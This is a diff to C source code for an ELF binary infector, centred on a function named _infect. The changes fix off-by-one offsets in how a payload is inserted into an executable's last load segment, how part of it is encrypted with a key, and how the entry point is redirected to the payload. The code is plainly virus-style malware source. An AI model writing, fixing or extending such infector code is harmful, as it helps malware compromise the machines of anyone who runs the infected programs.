@@ -98,8 +98,8 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 		//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
 		oldn = *n;
 		olds = *s;
-		_insert_zeros(s,n, ph[x].p_offset+ph[x].p_filesz, diff);
-		elf_shift_offset(*s, *n, ph[x].p_offset+ph[x].p_filesz, diff);
+		_insert_zeros(s,n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
+		elf_shift_offset(*s, *n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
 		//reset it
 		Elf64_Ehdr *h = (void*)*s;
 		ph = (*(void**)s) + h->e_phoff;
@@ -110,15 +110,15 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	size_t oldn2 = *n;
 	char *olds2 = *s;
-	_insert(s, n, pos, b, bn);
-	encrypt(((*s) + pos + 1 + crypt_off), crypt_len, (uint32_t*)key);
+	_insert(s, n, pos-1, b, bn);
+	encrypt(((*s) + pos + crypt_off), crypt_len, (uint32_t*)key);
 	//reset it
 	elf_shift_offset(*s, *n, pos, bn);
 	elf_update_flags_of_load_segments(*s, *n);
 	elf_change_size_last_load_segment(*s, *n, bn);
-	elf_set_off_entry(*s, *n, pos + 1);
+	elf_set_off_entry(*s, *n, pos);
 	h = (void*)*s;
-	update((*s) + pos + 1, bn, old_entry, h->e_entry, opt, *s, *n);
+	update((*s) + pos, bn, old_entry, h->e_entry, opt, *s, *n);
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
